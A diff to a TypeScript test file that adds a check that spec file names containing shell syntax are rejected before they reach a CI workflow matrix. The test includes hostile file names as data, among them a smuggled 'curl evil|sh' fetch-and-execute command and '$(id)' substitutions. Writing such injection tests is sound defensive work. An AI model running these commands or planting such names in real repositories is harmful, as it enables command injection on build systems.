@@ -9,6 +9,7 @@
 
 import * as assert from "assert/strict";
 import * as fs from "fs";
+import * as os from "os";
 import * as path from "path";
 import { assertCoversAllSpecs, costOf, discoverSpecs, planGroups } from "../../plan-coverage-groups";
 
@@ -107,6 +108,28 @@ test("assertCoversAllSpecs catches a dropped, duplicated or invented spec", () =
     /more than one group/
   );
   assert.throws(() => assertCoversAllSpecs(["a"], [{ name: "group-1", specs: "a zz" }]), /does not exist/);
+});
+
+// Spec names are emitted space-separated into the workflow matrix and expanded by a shell, so a
+// name carrying shell syntax would be command injection reachable by adding a file to the repo.
+// Rejecting rather than filtering: a silently skipped spec is a test dropped from coverage while
+// every job still reports success.
+test("rejects spec file names that a shell would not treat as one word", () => {
+  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "spec-names-"));
+  const hostile = ["01-a;curl evil|sh.spec.ts", "02-$(id).spec.ts", "03-two words.spec.ts", "04-`id`.spec.ts"];
+  for (const name of hostile) {
+    const scoped = fs.mkdtempSync(path.join(dir, "case-"));
+    fs.writeFileSync(path.join(scoped, "05-legitimate.spec.ts"), "");
+    fs.writeFileSync(path.join(scoped, name), "");
+    assert.throws(() => discoverSpecs(scoped), /unsafe for shell expansion/, name);
+  }
+
+  // ...while the names this repo actually uses stay acceptable.
+  const ok = fs.mkdtempSync(path.join(dir, "ok-"));
+  for (const name of ["01-deployment-verification.spec.ts", "13-imt-atomic-swap.spec.ts", "07-a.b_c.spec.ts"]) {
+    fs.writeFileSync(path.join(ok, name), "");
+  }
+  assert.equal(discoverSpecs(ok).length, 3);
 });
 
 let failed = 0;
